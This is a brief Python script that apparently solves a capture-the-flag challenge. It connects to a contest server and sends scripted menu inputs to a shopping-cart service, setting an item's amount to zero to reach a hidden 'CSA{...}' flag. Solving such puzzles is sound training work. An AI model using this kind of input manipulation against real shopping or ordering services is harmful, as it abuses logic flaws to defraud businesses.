import re
from sys import path
path.insert(0, '../..')
from connection import Socket


if __name__ == '__main__':
    LOAD_COUPONS, SHOW_CART, EDIT, FLAG_IDX, EDIT_KG, EDIT_AMOUNT = '5\n', '4', '2', '1', '2', '3'
    s = Socket("csa.csa-challenge.com", 1111)
    s.connect()
    s.send('\n'.join((LOAD_COUPONS, EDIT, FLAG_IDX, EDIT_KG, '1')))
    s.send('\n'.join((EDIT, FLAG_IDX, EDIT_AMOUNT, '0')))
    s.send('\n'.join((EDIT, FLAG_IDX, SHOW_CART)))
    msg = s.send('4').decode()
    r = re.search("CSA{.*}", msg)
    if r:
        print("The flag is:", r.group(0))
    else:
        print(msg)
    s.close()
